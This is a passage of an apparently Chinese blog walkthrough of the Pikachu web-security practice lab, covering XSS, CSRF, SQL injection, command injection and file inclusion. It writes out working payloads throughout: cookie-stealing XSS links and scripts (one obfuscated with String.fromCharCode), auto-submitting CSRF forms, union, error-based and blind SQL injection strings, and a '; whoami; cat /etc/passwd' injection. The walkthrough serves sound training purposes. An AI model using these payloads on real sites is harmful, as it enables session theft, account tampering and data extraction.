+<p>冲浪看看htmlspecialchars的资料<br>会把“&amp;”、“&lt;”、“&gt;”、“””转义成HTML实体<br>默认是不过滤单引号的<br>过滤单引号需要加上参数<code>ENT_QUOTES</code></p>
+<p>最后钓鱼链接：<br><code>http://www.pikachu.com/vul/xss/xss_02.php?message=%27+onclick%3Ddocument.location%3D%27http%3A%2F%2Fwww.pikachu.com%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27%2Bdocument.cookie%3B+%27&amp;submit=submit</code></p>
+<h3 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h3><p>还是输入框，GET提交到原页面<br>输入<code>www.baidu.com</code>？？？<br>输入<code>www.pikachu.com</code>，生成了一个a链接，输入拼接到了href属性当中</p>
+<p>然后发现怎么主动拼接和绕过都不好使<br>看眼源码，发现这次htmlspecialchars也过滤了单引号</p>
+<p>瞅眼提示：</p>
+<blockquote>
+<p>a标签里面的href，img里面的src属性,有什么特殊的么</p>
+</blockquote>
+<p>原来上面的两个属性都可以使用javascript伪协议，从而可以执行JS脚本</p>
+<p>于是payload：<code>javascript:alert(123)</code><br>点击链接后弹窗</p>
+<p>由于单引号也被过滤了，于是参考OWASP的备忘录，整出来这个payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="variable language_">document</span>.<span class="property">location</span>=<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">119</span>, <span class="number">46</span>, <span class="number">112</span>, <span class="number">105</span>, <span class="number">107</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">117</span>, <span class="number">46</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">112</span>, <span class="number">107</span>, <span class="number">120</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">47</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">46</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">63</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">105</span>, <span class="number">101</span>, <span class="number">61</span>)+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br></pre></td></tr></table></figure>
+
+<p>钓鱼链接：<a target="_blank" rel="noopener" href="http://www.pikachu.com/vul/xss/xss_03.php?message=javascript:document.location=String.fromCharCode(104,+116,+116,+112,+58,+47,+47,+119,+119,+119,+46,+112,+105,+107,+97,+99,+104,+117,+46,+99,+111,+109,+47,+112,+107,+120,+115,+115,+47,+120,+99,+111,+111,+107,+105,+101,+47,+99,+111,+111,+107,+105,+101,+46,+112,+104,+112,+63,+99,+111,+111,+107,+105,+101,+61)+document.cookie;&submit=submit">http://www.pikachu.com/vul/xss/xss_03.php?message=javascript%3Adocument.location%3DString.fromCharCode%28104%2C+116%2C+116%2C+112%2C+58%2C+47%2C+47%2C+119%2C+119%2C+119%2C+46%2C+112%2C+105%2C+107%2C+97%2C+99%2C+104%2C+117%2C+46%2C+99%2C+111%2C+109%2C+47%2C+112%2C+107%2C+120%2C+115%2C+115%2C+47%2C+120%2C+99%2C+111%2C+111%2C+107%2C+105%2C+101%2C+47%2C+99%2C+111%2C+111%2C+107%2C+105%2C+101%2C+46%2C+112%2C+104%2C+112%2C+63%2C+99%2C+111%2C+111%2C+107%2C+105%2C+101%2C+61%29%2Bdocument.cookie%3B&amp;submit=submit</a></p>
+<p>呃</p>
+<h3 id="XSS之JS输出"><a href="#XSS之JS输出" class="headerlink" title="XSS之JS输出"></a>XSS之JS输出</h3><p>输入框，GET提交到原页面<br>特殊之处在于输入是回显到了一段script标签中：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211116115801204.png" alt="image-20211116115801204"></p>
+<p>那就主动闭合，再打入自己的脚本标签：<br><code>&#39;;&lt;/script&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;/script&gt;</code><br>XSS成功，HTML元素变化：</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211116115948628.png" alt="image-20211116115948628"></p>
+<p>其他需要注意的是，script脚本内部不会对实体编码进行解释<br>以及JS的输出点应该使用‘\’对特殊字符进行转义</p>
+<h3 id="补充：其他一些钓鱼payload"><a href="#补充：其他一些钓鱼payload" class="headerlink" title="补充：其他一些钓鱼payload"></a>补充：其他一些钓鱼payload</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">document.write(&#x27;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&#x27;+document.cookie+&#x27;&quot;</span> <span class="attr">width</span>=<span class="string">&quot;0&quot;</span> <span class="attr">height</span>=<span class="string">&quot;0&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> /&gt;</span>&#x27;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>关键在于<strong>写操作</strong></p>
+<p>与XSS的区别：<br>CSRF：借权限<br>XSS：偷权限</p>
+<h3 id="CSRF（GET）"><a href="#CSRF（GET）" class="headerlink" title="CSRF（GET）"></a>CSRF（GET）</h3><p>先登录，一个能改信息的页面，然后发现提交修改信息的操作是GET请求<br>而且URL里没有token等鉴权参数</p>
+<p>那直接构造钓鱼链接给受害者点即可：<br>例如进行一个性的变：<br><code>http://www.pikachu.com/vul/csrf/csrfget/csrf_get_edit.php?sex=你跌&amp;phonenum=18656565545&amp;add=chinana&amp;email=lili%40pikachu.com&amp;submit=submit</code><br>模拟受害者点击之后，性别变成“你跌”了</p>
+<p>退出登录清除登录态，然后就不能钓鱼修改链接了</p>
+<hr>
+<p>另外提一手URL压缩<br>本来百度有个短网址服务，但是现在已经禁止个人用户创建新的短网址了</p>
+<h3 id="CSRF（POST）"><a href="#CSRF（POST）" class="headerlink" title="CSRF（POST）"></a>CSRF（POST）</h3><p>和上面差不多，但是变成POST提交参数，钓鱼URL没用了<br>那就钓鱼页面，POC：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>你跌跌<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;gogogo&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--注意自己添加action，以及检查enctype对应MIME--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;go&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://www.pikachu.com/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class="attr">hidden</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;per_title&quot;</span>&gt;</span>hello,lucy,欢迎来到个人会员中心 | <span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;color:bule;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;csrf_post.php?logout=1&quot;</span>&gt;</span>退出登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_name&quot;</span>&gt;</span>姓名:lucy<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_sex&quot;</span>&gt;</span>性别:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;怎么被改了&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_phone&quot;</span>&gt;</span>手机:<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;114514&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>    </span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_add&quot;</span>&gt;</span>住址:<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;暨猪&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_email&quot;</span>&gt;</span>邮箱:<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;lucy@pikachu.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;gogogo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;sub&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>TRICK!!!!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是：</p>
+<ul>
+<li>钓鱼页面需要放在公网（就不是file协议之类的）</li>
+<li>注意自己添加action</li>
+<li>注意表单的<strong>提交类型（enctype）</strong>要对应上（抓包看看）</li>
+</ul>
+<h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><p>GET提交请求，但是多了个随机生成的token字段<br>于是要构造钓鱼URL的话就要攻击者添加上那个token</p>
+<p>这就有点难办了。。。。<br>（WeBank还说很容易绕过来着？？？？我太菜了）</p>
+<p>上网查阅，有两种方向：</p>
+<ul>
+<li>一种是希望网站开发人员犯蠢</li>
+<li>一种是结合其他漏洞打</li>
+</ul>
+<hr>
+<p>所谓希望开发人员犯蠢，无非就是期望开发者对token的使用和检验不完整<br>偏向于公司内部进行安全测试的思路：</p>
+<ul>
+<li>不同用户token互通</li>
+<li>替换成相同长度的值</li>
+<li>删除token字段，赌他检测到没有就跳过检验</li>
+<li>识别&#x2F;推断token算法</li>
+<li>仅使用token的静态部分<br>意思是，一些token是{固定部分+动态部分}来组成的<br>可以试试仅用固定部分来提交，说不定能过</li>
+</ul>
+<p><del>不如去中奖</del></p>
+<hr>
+<p>结合其他漏洞打，首先是涉及到一个跨域的问题<br>比如有如下POC：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;user_token&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;hack&quot;</span>).<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;user_token&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;transfer&quot;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://网页服务器/dvwa/vulnerabilities/csrf&quot;</span> <span class="attr">id</span>=<span class="string">&quot;hack&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;attack()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span><span class="comment">&lt;!--表单主体--&gt;</span><span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>大概是，使用JS，通过一个看不见的框架偷偷获取登陆页面的token<br>然而由于同源策略，这样是行不通的<br>所以一般结合诸如XSS之类的漏洞，来搞token</p>
+<p>寄</p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h3><p>啥也没讲</p>
+<p>有个就是防御策略：变量过滤、参数化</p>
+<h3 id="数字型注入（POST）"><a href="#数字型注入（POST）" class="headerlink" title="数字型注入（POST）"></a>数字型注入（POST）</h3><p><code>99</code>：显示userid不存在</p>
+<p><code>99 or 1=1</code>：全注了出来，数字型注入</p>
+<p><code>99 union select 1,2</code>：判断出有两列</p>
+<p><code>99 union select database(), user()</code>：知道数据库及用户</p>
+<p><code>99 union select concat(table_name),2 from information_schema.tables where table_schema=database()</code>：知道所有表名</p>
+<p><code>99 union select concat(column_name),2 from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;</code>：知道users表的所有列</p>
+<p><code>99 union select concat(username),concat(password) from pikachu.users</code>：搞到所有用户名及对应密码的哈希</p>
+<hr>
+<p>上sqlmap：也没啥好说的，注爆啊</p>
+<p>但是还是不能写入shell</p>
+<h3 id="字符型注入（GET）"><a href="#字符型注入（GET）" class="headerlink" title="字符型注入（GET）"></a>字符型注入（GET）</h3><p><code>&#39;</code>：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’’’ at line 1</p>
+<p><del>然后尝试BP repeater注入结果被小皮防火墙截了，搞一搞</del><br>然后发现不是防火墙的问题<br>是URL编码的问题，编码之后就能够正常注入了<br>（好想要正版的BP专业版啊）</p>
+<p><code>&#39; or &#39;1&#39;=&#39;1</code>：全注出来了</p>
+<p><code>&#39; union select 1,2 %23</code>：判断出回显两列</p>
+<p>剩下的和上面差不多</p>
+<h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><p>先事先简单了解下<strong>模糊查询</strong>的概念</p>
+<p>大概，主要是like语句，与‘%’的配合使用<br>例如<code>select * from users where username like &#39;%婉%&#39;</code><br>这样会搜索出username像“X婉”、“X婉X”、“婉XXXX”等有“婉”的记录</p>
+<p>几个主要的符号：</p>
+<ul>
+<li><p>%：表示任意0个或多个字符。可匹配任意类型和长度的字符，有些情况下若是中文，请使用两个百分号（%%）表示</p>
+</li>
+<li><p>_：表示任意单个字符。匹配单个任意字符，它常用来限制表达式的字符长度语句</p>
+</li>
+<li><p>[]：匹配一个正则表达式</p>
+</li>
+</ul>
+<p>剩下的自己看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-lin-x-c-/p/10375412.html">博客</a>去吧，去吧去吧去吧</p>
+<hr>
+<p>查找框<br>查询一个“l”，回显“allen”、“lucy”、“lili”<br>猜测SQL语句类似于<br><code>select name,id,email from users where name like &#39;%&#123;input&#125;%&#39;</code><br>所以猜测要闭合的有百分号和引号</p>
+<p>尝试地址栏注入</p>
+<p><code>zwc</code>：0o。..没有搜索到你输入的信息！</p>
+<p><code>zwc%&#39; or 1=1 %23</code>：全注出来了</p>
+<p><code>zwc%&#39; union select 1,2,3 %23</code>：判断列数为三</p>
+<p>剩下的和上面差不多</p>
+<h3 id="XX型注入"><a href="#XX型注入" class="headerlink" title="XX型注入"></a>XX型注入</h3><blockquote>
+<p>管tmd的什么型，能够制造出闭合，就是本事</p>
+</blockquote>
+<p>好提示，看来是要自己探索下语句格式</p>
+<p><code>&#39;</code>：check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’’)’ at line 1（WTF）</p>
+<p><code>&#39;) or 1=1 %23</code>：全注</p>
+<p>下略</p>
+<h3 id="“insert-update”注入"><a href="#“insert-update”注入" class="headerlink" title="“insert&#x2F;update”注入"></a>“insert&#x2F;update”注入</h3><p>先注册一个，然后登入<br>然后修改个人信息</p>
+<p>看一下数据包，修改操作好像只是POST一些参数上去<br>其中姓名字段不能改，是固定的</p>
+<p>猜测后端的SQL语句类似于：<br><code>update table set field1=&#39;XXX&#39;,field2=&#39;XXX&#39; where name=&#39;Archeri&#39;</code></p>
+<p>如果存在注入，那可能存在这种情况：主动闭合，注释掉后面的‘where’限定<br>导致所有用户都被修改信息</p>
+<p>新注册一个user1用户，其余信息都是‘xxx’<br>然后回到Archeri用户，修改信息：</p>
+<img src="image-20211122084907443.png" alt="image-20211122084907443" style="zoom:67%;" />
+
+<p>然后发现了这个报错：check the manual that corresponds to your MySQL server version for the right syntax to use near ‘qqq’,address&#x3D;’qqq’,email&#x3D;’qqq’ where username&#x3D;’Archeri’’ at line 1</p>
+<p>性别一栏换成这个：<code>daddy&#39;; #</code><br>然后发现成功修改了user1用户的性别</p>
+<hr>
+<p>下面注出其他信息</p>
+<p>性别一栏：<code>hack&#39;,phonenum=database() where username=&#39;Archeri&#39;; #</code><br>手机一栏成功变成了当前数据库名</p>
+<p>注表名：<code>hack&#39;,phonenum=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where username=&#39;Archeri&#39;; #</code></p>
+<p>下略</p>
+<hr>
+<p>不小心忽略了注册页面也可以注入</p>
+<p>姓名填入一个引号：check the manual that corresponds to your MySQL server version for the right syntax to use near ‘xxx’),’’,’’,’’,’’)’ at line 1</p>
+<p>姓名填入<code>&#39;)</code>，密码随便填：check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’,md5(‘asd’),’’,’’,’’,’’)’ at line 1</p>
+<p><del>看来还有个md5处理密码需要看看怎么闭合下</del><br>其实也不用处理，只是影响到这个账号能不能正常登入而已</p>
+<p>既然为注册，那猜他SQL语句应该是类似为：<br><code>insert into table (field1,field2) values (&#39;XXX&#39;,&#39;XXX&#39;)</code></p>
+<p><strong>updatexml注入</strong><br><strong>完整报错信息，且没有别的很好的回显位置，考虑使用updatexml函数注入</strong></p>
+<p>注出当前数据库用户名（注意<strong>列数要一致</strong>）：<br><code>aaa&#39; or updatexml(1,concat(0x7e,(select user()),0x7e),1),md5(&#39;bbb&#39;),&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;) #</code></p>
+<p>剩下的就改updatexml函数里面中间的字符串参数</p>
+<h3 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h3><p>一个留言板，发表后能删除<br>看看数据包，留言用POST，删除用GET<br>删除的GET有一个id参数，怀疑这里是注入点</p>
+<p>参数设为‘’’：check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’ at line 1</p>
+<p><strong>完整报错信息，且没有别的很好的回显位置，考虑使用updatexml函数注入</strong></p>
+<p>payload（数字型不用引号）：<br><code>?id=9999 or updatexml(1,concat(0x7e,(select database()),0x7e),1)</code></p>
+<h3 id="“http-header”注入"><a href="#“http-header”注入" class="headerlink" title="“http header”注入"></a>“http header”注入</h3><p>登录，然后信息显示有IP、user agent、http accept、本次连接端口<br>可能是把发送请求包的header印了出来</p>
+<p>抓包重放改了两个header试试，还真是</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211122103200217.png" alt="image-20211122103200217"></p>
+<p>agent打入一个引号，有完整报错信息：check the manual that corresponds to your MySQL server version for the right syntax to use near ‘testestestest’,’54014’)’ at line 1</p>
+<p>猜SQL：<code>select &#39;IP&#39;,&#39;AGENT&#39;,&#39;ACCEPT&#39;,&#39;PORT&#39; ...</code></p>
+<p>但是agent打入这个却会完整显示出来：<br><code>aaa&#39;,database(),user()) #</code></p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211122104758072.png" alt="image-20211122104758072"></p>
+<p>updatexml()倒是可以：<br><code>&#39; or updatexml(1,concat(0x7e,(select database()), 0x7e),1),1,1) #</code></p>
+<h3 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h3><p><del>呃，又来</del></p>
+<p>存在用户（之前注册的）就给出信息，没有就给出一条固定的错误信息</p>
+<p>这里一定要先使前面的条件成立，即要先有一个存在的用户，例如：<br><code>Archeri&#39; and 1=1 #</code>可以<br><code>Archeri&#39; and 1=2 #</code>不行<br><code>&#39; or 1=1 #</code>不行</p>
+<p>其他情况需要自行判断怎么盲注</p>
+<hr>
+<p><code>Archeri&#39; and length(database())=7 #</code></p>
+<p><code>Archeri&#39; and ascii(substr(database(),1,1))&gt;97 #</code></p>
+<p>剩下的略了，看看sqli-labs靶场的笔记<br>总之就是熟悉length()、substr()、ascii()以及limit等的使用</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>和上面不一样的是，不管输入的用户名存不存在，回显都是统一的</p>
+<p>但是可以用sleep()函数结合逻辑关系的优先级来实现时间盲注，例如：<br><code>lili&#39; and database()=&#39;pikaccc&#39; and sleep(5) #</code>很快回显<br><code>lili&#39; and database()=&#39;pikachu&#39; and sleep(5) #</code>有明显延迟</p>
+<p>这样就可以达到盲注的效果</p>
+<p>下略</p>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>主要是利用了GBK系列编码，<strong>将两个字节当成是一个中文字符</strong>的原理</p>
+<p>相关配置为：<code>set character_set_client = gbk</code></p>
+<p>一般为引号被加上反斜杠转义的情况<br><code>1&#39; and 1=1 #</code>-&gt;<code>1\&#39; and 1=1 #</code><br>相当于查询id为‘1’ and 1&#x3D;1 #’的信息</p>
+<p>但是可以主动加上一个‘%df’<br><code>1%df&#39; and 1=1 #</code>-&gt;<code>1%df\&#39; and 1=1 #</code>-&gt;<code>1%df%5c&#39; and 1=1 #</code>-&gt;<code>1輼&#39; and 1=1 #</code><br>相当于查询id为‘1輼’的信息，然后执行and后面的判断</p>
+<p>我这里要改改MySQL的配置文件，因为他默认字符集是utf8<br>（但是一改就会报错，傻逼小皮）</p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h3><p>一般出现这种漏洞<br>是因为应用系统从设计上出现了提供给用户进行远程命令操作的接口</p>
+<p>现在有很多甲方企业有一些“自动化运维平台”，很容易有RCE漏洞</p>
+<p>如果需要给前端用户提供操作类的API接口<br>一定需要对接口输入的内容进行严格的判断<br>比如实施严格的白名单策略会是一个比较好的方法</p>
+<h3 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h3><p>一个输入栏，提醒你输入IP地址去ping<br>输入“10.10.10.1”，返回ping的终端输出结果</p>
+<p>输入<code>; echo &quot;haha&quot;</code>，回显“haha”，有RCE漏洞</p>
+<p>可以使用分号串联恶意命令</p>
+<p><code>; whoami; cat /etc/passwd</code></p>
+<h3 id="exec-“evel”"><a href="#exec-“evel”" class="headerlink" title="exec “evel”"></a>exec “evel”</h3><p>输入一个字符串，后台放到eval()函数里执行</p>
+<p>填入<code>phpinfo();</code>，页面变成phpinfo页</p>
+<p>eval()里面填入的应该是<strong>格式正确的PHP代码</strong></p>
+<h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><h3 id="概述-4"><a href="#概述-4" class="headerlink" title="概述"></a>概述</h3><p>可以使开发人员在一个代码文件中直接包含（引入）另一个代码文件<br>例如PHP的下列函数：</p>
+<ul>
+<li>include()&#x2F;include_once()</li>
+<li>require()&#x2F;require_once()</li>
+</ul>
+<p>如果包含的代码文件是一个变量，并且<strong>可以由用户控制</strong><br>那就很可能会有文件包含漏洞</p>
+<p>一般分两种：</p>
+<ul>
+<li>本地文件包含（local）<br>仅能对服务器本地文件进行包含。一般包含本地敏感文件，或者结合文件上传漏洞来打组合拳</li>
+<li>远程文件包含（remote）<br>一般是能够通过url来包含远程文件，危害大得多得多</li>
+</ul>
+<p>因此尽量不要让前端用户控制文件包含函数的变量<br>万不得已也要做严格的白名单过滤</p>
+<h3 id="local"><a href="#local" class="headerlink" title="local"></a>local</h3><p>一个选择框，选择NBA明星提交，返回相关信息</p>
+<p>值得注意的是URL里出现了一个<code>filename=file2.php</code><br>估计这里就是包含点</p>
+<p>能选择的就只有5个明星，直接提交<code>filename=file6.php</code><br>就发现秘密了</p>
+<img src="image-20211123090853752.png" alt="image-20211123090853752" style="zoom:67%;" />
+
+<p>包含下不存在的文件，发现一些报错信息把相关路径给了出来</p>
